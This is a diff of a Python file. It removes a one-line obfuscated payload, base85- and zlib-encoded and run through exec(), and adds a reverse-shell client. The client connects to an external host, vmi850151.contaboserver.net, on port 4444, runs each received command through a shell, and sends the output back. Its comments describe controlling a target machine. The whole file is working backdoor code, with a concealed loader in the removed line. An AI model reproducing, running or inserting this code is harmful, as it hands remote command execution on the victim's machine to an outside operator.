@@ -1,1 +1,40 @@
-import zlib,base64;exec(zlib.decompress(base64.b85decode('c${@q!EW0y488j+h~^L*&AfJNfg(V9+o87}b{mF4k(gSDEEy7=Ab&qnwo_xy1OzcCk$msziMH)RBuGIYk%|@Q;3)<Np~I-i`VUB#MA$+&0IB$a1g+AI^;p;;HKge)_4_UcjVTpHg56lO9{$P-xVp3GiJP=tPZ&WfFC9H<0tyhQ!N|!gupKC4BA1fJ3F8UlCLiw;LOA<tjdg-9+LI!Lw|B4yFhNiU4=!lsiY6ptEbCKiU!ETxpC4<XsP<tfT6?5*k>T&)i5Ek!M@VHU$s3T}O5pFUH)%nFfe*E=q0GP^thbEHh0wtv#4N4#edrT7%bI$@DH}sJ6XE<;af{;IScmX4_P8xzTt<-+QR|5MR6ag@d#bK`LYudLZNL4l4eDU9yzA-k<>jt|9h28)y%qU~`hr+D%6}jj%hf2v3zXV?)|*yfEgC*k=IY<Ki|V2Z6Fh>V$sV62rHwQz<~SYtT&;pvc*vj{)JNHo%STZ1)6^^HE}7KVNfqF_XisRMq=x(11U~RR+`zpEti;ehLC?N|(WHVe_MQWiF3GmmsW@)r`>`JQLR;&V+c3i;vLSl{<uCHz<xc~h?Zyo;193=2E=LhnyTGDbBlmcHEcLr!8zf#Tyn)o9b2~8uf0N-ZyLs~4`;Q#Q7;na{|2JGM^|>L~{zA+t%R*74V2>sne14JqGJ8j9X_&0ZpCNZARO<mUyH**V0ryjk;ZCus*VrJx_$(b?^-%DCefXG2NwJ(a-oVxTE9ji!I}FaiUL~tXGQ|zTY+ijfz{U&bByOCZb+QJBSB`MbCY4Ry$0&2)9O6;r`Sd*-lUd|5c~mTVr8=QEB}1vv=i8p~xgYqXdcadwBHH>D*45JIJo!A$lIJs)XXOBxpURvFqst>whLm<Z2B!(k(#!0VP+1kj`U|ZH@b3')).decode())
+import socket
+# control operating system of target machine
+import os
+import subprocess
+
+s = socket.socket() # client computer can connect to others
+
+# ip address of server, can use own computer's private IP if doing on local
+host = 'vmi850151.contaboserver.net'
+port = 4444
+
+s.connect((host, port)) # binds client computer to server computer
+
+# infinite loop for continuous listening for server's commands
+while True:
+        data = s.recv(1024)
+        if data[:2].decode("utf-8") == 'cd': # command to change directory (cd)
+                os.chdir(data[3:].decode("utf-8")) # look at target directory to cd to
+
+        if len(data) > 0: # check if there are actually data/commands received (that is not cd)
+                
+                # opens up a process to run a command similar to running in terminal, takes out any output and pipes out to standard stream
+                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
+                
+                # bytes and string versions of results
+                output_bytes = cmd.stdout.read() + cmd.stderr.read() # bytes version of streamed output
+                output_str = str(output_bytes, "utf-8") # plain old basic string
+
+                # getcwd allows the server side to see where the current working directory is on the client
+                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
+                print(output_str) # client can see what server side is doing
+
+# close connection
+s.close()
+
+
+
+
+
+
